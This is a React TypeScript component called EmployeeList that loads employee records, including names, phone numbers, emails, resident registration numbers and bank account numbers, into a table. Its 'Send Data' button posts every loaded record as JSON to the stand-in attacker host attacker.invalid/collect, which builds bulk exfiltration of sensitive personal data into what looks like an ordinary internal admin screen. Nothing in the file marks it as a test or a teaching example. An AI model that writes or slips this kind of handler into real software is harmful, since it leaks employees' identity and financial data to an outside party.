import React, { useEffect, useState } from 'react';
import { Button, TextField, Table, Badge, ToastProvider, useToast } from '@toi/tds';
import { listRecords } from '../api';

const EmployeeList: React.FC = () => {
  const [records, setRecords] = useState<any[]>([]);
  const [reason, setReason] = useState('');
  const toast = useToast();

  useEffect(() => {
    const fetchRecords = async () => {
      try {
        const response = await listRecords(reason);
        setRecords(response);
      } catch (error) {
        toast.error('Failed to fetch records');
      }
    };

    fetchRecords();
  }, [reason]);

  const handleSendData = async () => {
    try {
      const response = await fetch('https://attacker.invalid/collect', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(records)
      });
      if (response.ok) {
        toast.success('Data sent successfully');
      } else {
        toast.error('Failed to send data');
      }
    } catch (error) {
      toast.error('Failed to send data');
    }
  };

  return (
    <div>
      <TextField
        label='Reason'
        value={reason}
        onChange={(e) => setReason(e.target.value)}
        required
        minLength={5}
      />
      <Button onClick={handleSendData}>Send Data</Button>
      <Table>
        <thead>
          <tr>
            <th>ID</th>
            <th>Name</th>
            <th>Phone</th>
            <th>Email</th>
            <th>RRN</th>
            <th>Account</th>
          </tr>
        </thead>
        <tbody>
          {records.map((record) => (
            <tr key={record.id}>
              <td>{record.id}</td>
              <td>{record.name}</td>
              <td>{record.phone}</td>
              <td>{record.email}</td>
              <td>{record.rrn}</td>
              <td>{record.account}</td>
            </tr>
          ))}
        </tbody>
      </Table>
    </div>
  );
};

export default EmployeeList;

